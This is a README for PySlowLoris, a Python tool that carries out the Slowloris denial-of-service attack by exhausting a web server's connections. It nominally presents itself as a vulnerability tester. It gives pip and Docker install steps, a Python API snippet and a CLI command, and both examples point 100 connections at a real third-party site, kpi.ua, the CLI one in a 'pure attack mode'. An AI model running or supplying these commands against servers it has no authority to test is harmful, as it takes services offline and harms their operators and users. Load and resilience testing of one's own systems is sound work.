# PySlowLoris
[![Gitter chat](https://badges.gitter.im/gitterHQ/gitter.png)](https://gitter.im/SlowLoris-dev/Lobby)
[![License](https://img.shields.io/badge/license-MIT%20license-orange.svg)](https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE)
[![Python](https://img.shields.io/badge/python-3.8-blue.svg)](https://github.com/maxkrivich/SlowLoris)
[![Build Status](https://travis-ci.org/maxkrivich/SlowLoris.svg?branch=master)](https://travis-ci.org/maxkrivich/SlowLoris)
[![PyPI version](https://badge.fury.io/py/PySlowLoris.svg)](https://badge.fury.io/py/PySlowLoris)

PySlowLoris is a tool for testing if your web server is vulnerable to slow-requests kind of attacks. The module is based on python-trio for Asynchronous I/O and poetry for dependency management. The idea behind this approach to create as many connections with a server as possible and keep them alive and send trash headers through the connection. Please DO NOT use this in the real attacks on the servers.

More information about the attack you can find [here].

### Installation

#### PyPi

For installation through the PyPI:

```sh
$ pip install pyslowloris==2.0.0
```
This method is prefered for installation of the most recent stable release.


#### Source-code

For installation through the source-code for local development:
```sh
$ git clone https://github.com/[username]/SlowLoris.git
$ cd SlowLoris
$ pip install poetry
$ pyenv install 3.8.3
$ pyenv local 3.8.3
$ poetry env use 3.8.3
```

### Basic Usage

Available command list:

```sh
$ slowloris --help
usage: slowloris [-h] -u URL [-c CONNECTION_COUNT] [-s]

Asynchronous Python implementation of SlowLoris attack

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Link to a web server (http://google.com) - str
  -c CONNECTION_COUNT, --connection-count CONNECTION_COUNT
                        Count of active connections (default value is 247) - int
  -s, --silent          Ignore all of the errors [pure attack mode] - bool
```

### Docker usage

#### Download image from Docker Hub

Pull the image from [Docker Hub](https://hub.docker.com/r/maxkrivich/pyslowloris/) and run a container:

```bash
$ docker pull maxkrivich/pyslowloris
$ docker run --rm -it maxkrivich/pyslowloris [-h] [-u URL] [-c CONNECTION_COUNT] [-s SILENT]
```

#### Build image from source-code

Also you can build image from [Dockerfile](https://github.com/maxkrivich/SlowLoris/blob/master/Dockerfile) and run a container:

```bash
$ docker build -t pyslowloris .
$ docker run --rm -it pyslowloris [-h] [-u URL] [-c CONNECTION_COUNT] [-s SILENT]
```

**Note:** *Don't forget about 'sudo'!*



### Example of usage

#### How to use module through Python API
Here is an example of usage

```python
from pyslowloris import HostAddress, SlowLorisAttack

url = HostAddress.from_url("http://kpi.ua")
connections_count = 100

loris = SlowLorisAttack(url, connections_count, silent=True)
loris.start()
```

#### How to use module via CLI

The following command helps to use module from command line

```sh
$ slowloris -u http://kpi.ua/ -c 100 -s
```
###### stop execution: Ctrl + C



### Testing

#### Testing with real apache server

```bash
$ docker-compose up web_server -d
$ .....
```

#### Module-tests
```bash
$ make pytest
```

### Bugs, issues and contributing

If you find [bugs] or have [suggestions] about improving the module, don't hesitate to contact me.

### License

This project is licensed under the MIT License - see the [LICENSE](https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE) file for details

Copyright (c) 2017-2020 Maxim Krivich

[here]: <https://en.wikipedia.org/wiki/Slowloris_(computer_security)>
[bugs]: <https://github.com/maxkrivich/SlowLoris/issues>
[suggestions]: <https://github.com/maxkrivich/SlowLoris/issues>
